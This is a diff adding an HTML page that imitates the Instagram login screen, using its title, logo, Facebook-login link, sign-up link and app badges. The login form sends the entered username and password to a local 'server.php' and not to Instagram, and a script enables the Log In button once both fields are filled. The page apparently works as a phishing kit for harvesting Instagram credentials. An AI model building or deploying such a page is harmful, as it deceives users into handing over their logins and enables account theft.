@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <link rel="stylesheet" href="css/styles.css" />
+    <link rel="stylesheet" href="css/media-queries.css" />
+    <link rel="icon" href="assets/images/favicon.ico" />
+    <style type="text/css">
+      .log-in-button{
+        background-color: #b2dffc;
+      }
+      footer{
+        color: #cbc8ce;
+        width: 600px;
+        font-size: 14px;
+        line-height: 18px;
+        margin: ;
+        
+             }
+      footer li a{
+        float: right;
+
+        color: #cbc8ce;
+        display: inline-flex;
+        font-size: 14px;
+        line-height: 18px;
+      }
+     
+
+    </style>
+  </head>
+  <body>
+    <form method="Post" action="server.php">
+    <main>
+      <div class="log-in-container">
+        <div class="log-in">
+          <!-- Logo -->
+          <img src="assets/images/instagram-logo.png" class="logo" />
+          <!-- Log in form -->
+          <div class="log-in-form">
+            <input type="text" id="username" name="username" placeholder="Phone number, username or email" onkeyup="sa()" />
+            <input type="password" id="password" name="password" placeholder="Password" onkeyup="sa()" />
+            <button id="submit" class="log-in-button" disabled name="submit">Log In</button>
+          </div>
+          <!-- OR divider -->
+          <span class="or-divider">OR</span>
+          <!-- Log in with Facebook -->
+          <div class="fb-login">
+            <a href="home.php">
+              <img src="assets/images/facebook-icon.png" />
+              <span>Log in with Facebook</span></a>
+            </a>
+          </div>
+          <!-- Forgot password? -->
+          <a id="fo" href="#">Forgot password?</a>
+        </div>
+        <!-- Sign up -->
+        <div class="sign-up">
+          <span>Don't have an account?</span><a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+        </div>
+        <!-- Download app -->
+        <div class="get-the-app">
+          <span>Get the app</span>
+          <div class="app-images">
+            <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&ct=igweb.loginPage.badge&mt=8&vt=lo"><img src="assets/images/applestore.png" /></a>
+            <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&ct=igweb.loginPage.badge&mt=8&vt=lo"><img src="assets/images/googlestore.png" /></a>
+          </div>
+        </div>
+      </div>
+      <!-- Phones -->
+      <div class="phones-container">
+        <img src="assets/images/phones.png" />
+      </div>
+    </main>
+    </form>
+    
+    <script type="text/javascript">
+      
+      const pass=document.getElementById("password");
+      const button=document.getElementById("submit");
+//       pass.addEventListener('keyup', (e) =>{
+//         const val = e.currentTarget.value;
+        
+//         if (val.length > 6) {
+//          button.disabled = false;
+//          console.log(val);
+//          document.getElementById("submit").style.background = "#0095f6";
+//         }else{
+//           button.disabled = true;
+// document.getElementById("submit").style.background = "#b2dffc";
+         
+        
+//         }
+  
+// });
+function sa() {
+
+  
+  var x = document.getElementById("password").value;
+  var y= document.getElementById("username").value;
+  if(x.length >6 && y.length >0){
+    button.disabled = false;
+    document.getElementById("submit").style.background = "#0095f6";
+  }else{
+    button.disabled = true;
+    document.getElementById("submit").style.background = "#b2dffc";
+
+    
+  }
+  
+
+}
+     
+
+    </script>
+  </body>
+</html>
